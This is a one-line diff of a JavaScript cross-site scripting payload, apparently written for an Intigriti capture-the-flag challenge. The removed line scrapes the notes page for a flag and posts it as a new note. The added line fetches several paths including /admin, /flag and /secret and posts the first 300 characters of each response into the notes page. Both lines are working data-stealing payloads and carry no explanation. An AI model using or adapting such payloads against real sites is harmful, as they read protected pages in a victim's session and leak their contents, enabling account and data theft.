@@ -1,1 +1,1 @@
-fetch('/notes').then(r=>r.text()).then(d=>{var f=d.match(/INTIGRITI\{[^}]+\}/);if(f){fetch('/notes',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=FLAG&content='+encodeURIComponent(f[0])})}});
+['/','/notes','/search','/admin','/flag','/secret'].forEach(u=>fetch(u).then(r=>r.text()).then(d=>fetch('/notes',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title='+encodeURIComponent(u)+'&content='+encodeURIComponent(d.substring(0,300))})));
